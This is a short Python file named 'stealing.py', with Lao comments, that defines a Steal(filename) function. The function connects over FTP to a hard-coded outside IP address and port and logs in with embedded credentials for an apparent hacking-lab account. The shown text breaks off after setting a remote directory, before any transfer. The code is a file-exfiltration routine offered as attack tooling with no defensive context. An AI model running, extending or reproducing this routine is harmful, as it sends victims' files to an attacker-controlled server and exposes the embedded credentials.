# stealing.py

import ftplib

def Steal(filename):
	ip = '119.59.104.18'
	port = 2002
	username = 'member@uc-hacklabs.com'
	password = 'HackMB123'

	ftp = ftplib.FTP() # ປະກາດໂຕ FTP
	ftp.connect(ip,port) # ເຊື່ອມຕໍ່
	ftp.login(username,password)

	mypath = '/heryhack'
	 
